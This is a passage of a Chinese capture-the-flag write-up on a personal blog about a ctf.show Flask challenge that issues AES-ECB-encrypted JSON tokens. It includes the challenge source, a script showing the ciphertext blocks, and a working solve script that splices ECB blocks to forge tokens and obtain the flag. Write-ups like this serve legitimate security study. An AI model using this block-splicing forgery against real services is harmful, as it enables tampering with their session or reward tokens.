class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*-coding:utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"># File       : app.py</span></span><br><span class="line"><span class="string"># Time       ：2022/10/20 15:16</span></span><br><span class="line"><span class="string"># Author     ：g4_simon</span></span><br><span class="line"><span class="string"># version    ：python 3.9.7</span></span><br><span class="line"><span class="string"># Description：DragonBall Radar (BlockChain)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#网上找的AES加密代码，加密我又不懂，加就完事儿了</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AESCipher</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,key</span>):</span><br><span class="line">        self.key = self.add_16(hashlib.md5(key.encode()).hexdigest()[:<span class="number">16</span>])</span><br><span class="line">        self.model = AES.MODE_ECB</span><br><span class="line">        self.aes = AES.new(self.key,self.model)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add_16</span>(<span class="params">self,par</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(par) == <span class="built_in">str</span>:</span><br><span class="line">            par = par.encode()</span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(par) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">            par += <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> par</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">aesencrypt</span>(<span class="params">self,text</span>):</span><br><span class="line">        text = self.add_16(text)</span><br><span class="line">        self.encrypt_text = self.aes.encrypt(text)</span><br><span class="line">        <span class="keyword">return</span> self.encrypt_text</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">aesdecrypt</span>(<span class="params">self,text</span>):</span><br><span class="line">        self.decrypt_text = self.aes.decrypt(text)</span><br><span class="line">        self.decrypt_text = self.decrypt_text.strip(<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> self.decrypt_text</span><br><span class="line"><span class="comment">#初始化全局变量</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">flag=os.getenv(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line">AES_ECB=AESCipher(flag)</span><br><span class="line">app.config[<span class="string">&#x27;JSON_AS_ASCII&#x27;</span>] = <span class="literal">False</span></span><br><span class="line"><span class="comment">#懒得弄数据库或者类，直接弄字典就完事儿了</span></span><br><span class="line">players=&#123;&#125;</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    提供登录功能</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/radar&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">radar</span>():</span><br><span class="line">   <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">   提供雷达界面</span></span><br><span class="line"><span class="string">   &quot;&quot;&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/find_dragonball&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span>  <span class="title function_">find_dragonball</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    找龙珠，返回龙珠地址</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    xxxxxxxxxxx<span class="comment">#无用代码可以忽略</span></span><br><span class="line">    <span class="keyword">if</span> search_count==<span class="number">10</span>:<span class="comment">#第一次搜寻，给一个一星龙珠</span></span><br><span class="line">        dragonball=<span class="string">&quot;1&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> search_count&lt;=<span class="number">0</span>:</span><br><span class="line">        data=&#123;<span class="string">&quot;code&quot;</span>:<span class="number">1</span>,<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;搜寻次数已用完&quot;</span>&#125;</span><br><span class="line">        <span class="keyword">return</span> jsonify(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        random_num=random.randint(<span class="number">1</span>,<span class="number">1000</span>)</span><br><span class="line">        <span class="keyword">if</span> random_num&lt;=<span class="number">6</span>:</span><br><span class="line">            dragonball=一个没拿过的球，比如<span class="string">&#x27;6&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            dragonball=<span class="string">&#x27;0&#x27;</span><span class="comment">#0就代表没有发现龙珠</span></span><br><span class="line">    players[player_id][<span class="string">&#x27;search_count&#x27;</span>]=search_count-<span class="number">1</span></span><br><span class="line">    data=&#123;<span class="string">&#x27;player_id&#x27;</span>:player_id,<span class="string">&#x27;dragonball&#x27;</span>:dragonball,<span class="string">&#x27;round_no&#x27;</span>:<span class="built_in">str</span>(<span class="number">11</span>-search_count),<span class="string">&#x27;time&#x27;</span>:time.strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>)&#125;</span><br><span class="line">    <span class="comment">#json.dumps(data)=&#x27;&#123;&quot;player_id&quot;: &quot;572d4e421e5e6b9bc11d815e8a027112&quot;, &quot;dragonball&quot;: &quot;1&quot;, &quot;round_no&quot;: &quot;9&quot;, &quot;time&quot;:&quot;2022-10-19 15:06:45&quot;&#125;&#x27;</span></span><br><span class="line">    data[<span class="string">&#x27;address&#x27;</span>]= base64.b64encode(AES_ECB.aesencrypt(json.dumps(data))).decode()</span><br><span class="line">    <span class="keyword">return</span> jsonify(data)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/get_dragonball&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_dragonball</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    根据龙珠地址解密后添加到用户信息</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    xxxxxxxxx<span class="comment">#无用代码可以忽略</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        player_id=request.cookies.get(<span class="string">&quot;player_id&quot;</span>)</span><br><span class="line">        address=request.args.get(<span class="string">&#x27;address&#x27;</span>)</span><br><span class="line">        data=AES_ECB.aesdecrypt(base64.b64decode(address))</span><br><span class="line">        data=json.loads(data.decode())</span><br><span class="line">        <span class="keyword">if</span> data[<span class="string">&#x27;dragonball&#x27;</span>] !=<span class="string">&quot;0&quot;</span>:</span><br><span class="line">            players[data[<span class="string">&#x27;player_id&#x27;</span>]][<span class="string">&#x27;dragonballs&#x27;</span>].append(data[<span class="string">&#x27;dragonball&#x27;</span>])</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;get_ball&#x27;</span>:data[<span class="string">&#x27;dragonball&#x27;</span>]&#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;code&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;msg&#x27;</span>:<span class="string">&quot;这个地址没有发现龙珠&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;code&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;msg&#x27;</span>:<span class="string">&quot;你干啥???????&quot;</span>&#125;)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    查看龙珠库存</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment">#如果有7颗龙珠就拿到flag~</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_source</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    查看源代码</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>,debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
<p>在<code>find_dragonball</code>路由里面对address进行了一次AES加密，是将<code>data</code>和<code>data[address]</code>进行了分组加密，然后会吐给我们一个address，之后在<code>get_dragonball</code>路由获取龙珠。<br>我们现在要做的事情和伪造JWT很像，就是如何去伪造一个address，我们首先可以用g4大佬的脚本分析一下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">url=<span class="string">&#x27;http://57529baf-8d1b-4e0d-9beb-0ca4cce49a36.challenge.ctf.show/&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s=requests.session()</span><br><span class="line">username=<span class="built_in">str</span>(random.randint(<span class="number">1</span>,<span class="number">100000</span>))</span><br><span class="line"><span class="built_in">print</span>(username)</span><br><span class="line">r=s.get(url+<span class="string">&#x27;?username=&#x27;</span>+username)</span><br><span class="line">responses=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        r=s.get(url+<span class="string">&#x27;find_dragonball&#x27;</span>)</span><br><span class="line">        responses.append(json.loads(r.text))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> responses:</span><br><span class="line">        <span class="comment">#    data[&#x27;address&#x27;]= base64.b64encode(AES_ECB.aesencrypt(json.dumps(data))).decode()</span></span><br><span class="line">        data=json.dumps(&#123;<span class="string">&#x27;player_id&#x27;</span>:item[<span class="string">&#x27;player_id&#x27;</span>],<span class="string">&#x27;dragonball&#x27;</span>:item[<span class="string">&#x27;dragonball&#x27;</span>],<span class="string">&#x27;round_no&#x27;</span>:item[<span class="string">&#x27;round_no&#x27;</span>],<span class="string">&#x27;time&#x27;</span>:item[<span class="string">&#x27;time&#x27;</span>]&#125;)</span><br><span class="line">        miwen=base64.b64decode(item[<span class="string">&#x27;address&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="built_in">len</span>(miwen)/<span class="number">16</span>)):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;x*<span class="number">16</span>&#125;</span>\t<span class="subst">&#123;data[x*<span class="number">16</span>:x*<span class="number">16</span>+<span class="number">16</span>]&#125;</span>\t<span class="subst">&#123;miwen[x*<span class="number">16</span>:x*<span class="number">16</span>+<span class="number">16</span>]&#125;</span>&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>用这个脚本可以直观的显示一下加密的意思：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">0	&#123;&quot;player_id&quot;: &quot;1	b&#x27;Z\x1eMi\x17\xd0+\xc4&lt;\xb1\xa1\x043\xfe\xe2_&#x27;</span><br><span class="line">16	5b6f28363206ef31	b&#x27;|\tp\xcd\xe8k#\xa0!Z\x8f\xe8nw\xa3\xb4&#x27;</span><br><span class="line">32	8d53ecd59b53dfb&quot;	b&#x27;y\x7f\xe0\x9c2\xc6Q\xffW\x80,\xec\x13\xf5(\xb3&#x27;</span><br><span class="line">48	, &quot;dragonball&quot;: 	b&#x27;\xdaz\xe3a\xf7M#\x94$\x1f\xf4\rL\xa0a?&#x27;</span><br><span class="line">64	&quot;0&quot;, &quot;round_no&quot;:	b&#x27;f\xbcw\xdfLtu\xba\x80d\x0e9C&lt;\x04\x0b&#x27;</span><br><span class="line">80	 &quot;3&quot;, &quot;time&quot;: &quot;2	b&#x27;~N\xab\xcdW\xecVq\xe0\xc8\xfc\x19K^P\xb0&#x27;</span><br><span class="line">96	022-11-20 07:25:	b&#x27;\x93\xf6bbc\xdf\x8c\xcd\xe0A\x02\xd5\x10/m\x14&#x27;</span><br><span class="line">112	33&quot;&#125;	b&#x27;\x84\xde\xb4:p\x8e[\x08Z\xf1\xa4\xed.5c9&#x27;</span><br><span class="line"></span><br><span class="line">0	&#123;&quot;player_id&quot;: &quot;1	b&#x27;Z\x1eMi\x17\xd0+\xc4&lt;\xb1\xa1\x043\xfe\xe2_&#x27;</span><br><span class="line">16	5b6f28363206ef31	b&#x27;|\tp\xcd\xe8k#\xa0!Z\x8f\xe8nw\xa3\xb4&#x27;</span><br><span class="line">32	8d53ecd59b53dfb&quot;	b&#x27;y\x7f\xe0\x9c2\xc6Q\xffW\x80,\xec\x13\xf5(\xb3&#x27;</span><br><span class="line">48	, &quot;dragonball&quot;: 	b&#x27;\xdaz\xe3a\xf7M#\x94$\x1f\xf4\rL\xa0a?&#x27;</span><br><span class="line">64	&quot;0&quot;, &quot;round_no&quot;:	b&#x27;f\xbcw\xdfLtu\xba\x80d\x0e9C&lt;\x04\x0b&#x27;</span><br><span class="line">80	 &quot;4&quot;, &quot;time&quot;: &quot;2	b&quot;\xe6\xb8\xa1\xcdB\xb8`\x9e&#123;O\xbe&#x27;\xe9Z\xb5[&quot;</span><br><span class="line">96	022-11-20 07:25:	b&#x27;\x93\xf6bbc\xdf\x8c\xcd\xe0A\x02\xd5\x10/m\x14&#x27;</span><br><span class="line">112	33&quot;&#125;	b&#x27;\x84\xde\xb4:p\x8e[\x08Z\xf1\xa4\xed.5c9&#x27;</span><br><span class="line"></span><br><span class="line">0	&#123;&quot;player_id&quot;: &quot;1	b&#x27;Z\x1eMi\x17\xd0+\xc4&lt;\xb1\xa1\x043\xfe\xe2_&#x27;</span><br><span class="line">16	5b6f28363206ef31	b&#x27;|\tp\xcd\xe8k#\xa0!Z\x8f\xe8nw\xa3\xb4&#x27;</span><br><span class="line">32	8d53ecd59b53dfb&quot;	b&#x27;y\x7f\xe0\x9c2\xc6Q\xffW\x80,\xec\x13\xf5(\xb3&#x27;</span><br><span class="line">48	, &quot;dragonball&quot;: 	b&#x27;\xdaz\xe3a\xf7M#\x94$\x1f\xf4\rL\xa0a?&#x27;</span><br><span class="line">64	&quot;0&quot;, &quot;round_no&quot;:	b&#x27;f\xbcw\xdfLtu\xba\x80d\x0e9C&lt;\x04\x0b&#x27;</span><br><span class="line">80	 &quot;5&quot;, &quot;time&quot;: &quot;2	b&#x27;\x87\xa0@\xfaLOSNX\x9e\x87\xce\xdf\xf6\xa0\xa3&#x27;</span><br><span class="line">96	022-11-20 07:25:	b&#x27;\x93\xf6bbc\xdf\x8c\xcd\xe0A\x02\xd5\x10/m\x14&#x27;</span><br><span class="line">112	33&quot;&#125;	b&#x27;\x84\xde\xb4:p\x8e[\x08Z\xf1\xa4\xed.5c9&#x27;</span><br></pre></td></tr></table></figure>
<p>截取了跑出来的2组数据,AES-CEB加密方式，一组16个字符串，左边是明文，右边是密文<br>可以看到密文相同时，密文也是相同的，唯一不同的就是这一组：<br><code>64	&quot;0&quot;, &quot;round_no&quot;:</code>由于这是计算你抽了多少次奖的记录，所以会有所不同，我们要做的也就是把这行去掉，构造一个伪造的address，让抽奖次数等于我们的龙珠编号，和反序列化字符逃逸有点相似吼</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://57529baf-8d1b-4e0d-9beb-0ca4cce49a36.challenge.ctf.show/&#x27;</span></span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">username = <span class="built_in">str</span>(random.randint(<span class="number">1</span>, <span class="number">100000</span>))</span><br><span class="line"><span class="built_in">print</span>(username)</span><br><span class="line">r = s.get(url + <span class="string">&#x27;?username=&#x27;</span> + username)</span><br><span class="line">responses = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    r = s.get(url + <span class="string">&#x27;find_dragonball&#x27;</span>)</span><br><span class="line">    responses.append(json.loads(r.text))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> responses:</span><br><span class="line">    <span class="comment">#    data[&#x27;address&#x27;]= base64.b64encode(AES_ECB.aesencrypt(json.dumps(data))).decode()</span></span><br><span class="line">    data = json.dumps(&#123;<span class="string">&#x27;player_id&#x27;</span>: item[<span class="string">&#x27;player_id&#x27;</span>], <span class="string">&#x27;dragonball&#x27;</span>: item[<span class="string">&#x27;dragonball&#x27;</span>], <span class="string">&#x27;round_no&#x27;</span>: item[<span class="string">&#x27;round_no&#x27;</span>],</span><br><span class="line">                       <span class="string">&#x27;time&#x27;</span>: item[<span class="string">&#x27;time&#x27;</span>]&#125;)</span><br><span class="line">    miwen = base64.b64decode(item[<span class="string">&#x27;address&#x27;</span>])</span><br><span class="line">    round_no = item[<span class="string">&#x27;round_no&#x27;</span>]</span><br><span class="line">    fake = miwen[:<span class="number">64</span>] + miwen[<span class="number">80</span>:]</span><br><span class="line">    fake=base64.b64encode(fake).decode()</span><br><span class="line">    <span class="comment"># print(fake)</span></span><br><span class="line">    r=s.get(url+<span class="string">&#x27;get_dragonball&#x27;</span>,params=&#123;<span class="string">&quot;address&quot;</span>:fake&#125;)</span><br><span class="line">r=s.get(url+<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668931826262-65e4e1c0-f00f-4009-8f2b-9534cfc218d1.png#averageHue=%232e2d2d&clientId=ua6115b69-32fa-4&from=paste&height=128&id=u15dbc797&name=image.png&originHeight=160&originWidth=760&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22408&status=done&style=none&taskId=u81503e4b-f292-4206-94c0-7fbf80c4379&title=&width=608" alt="image.png"><br>最后你可以看到flag，脑洞大开</p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/WriteUp/" class="tag">#WriteUp</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/03/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982022/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">极客大挑战2022</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/03/02/%E6%AF%8F%E5%91%A8%E5%A4%A7%E6%8C%91%E6%88%98%E2%80%94%E2%80%94RCE/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">每周大挑战-RCE</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2025 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>